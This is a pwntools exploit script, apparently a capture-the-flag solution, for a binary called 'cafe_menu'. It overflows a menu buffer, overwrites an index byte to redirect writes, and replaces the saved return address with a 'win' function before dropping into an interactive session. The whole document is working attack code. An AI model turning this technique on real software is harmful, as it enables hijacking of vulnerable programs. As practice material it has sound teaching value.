#!/usr/bin/env python3
from pwn import *

exe = ELF('./cafe_menu')
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_RIP = 72

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── exploit phase ─────────────────────────────────────────────────────────
    r.recvuntil(b"Enter today's specials (send 0xff to finish):")

    payload = flat(
        b'A' * 48,          # fill menu[0..47] completely
        b'\x47',            # overwrite idx low byte; after idx++, idx = 72
        p64(exe.sym.win),   # 8 bytes written one-by-one to menu[72..79] = saved RIP
        b'\xff',            # terminate the loop and trigger the return
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()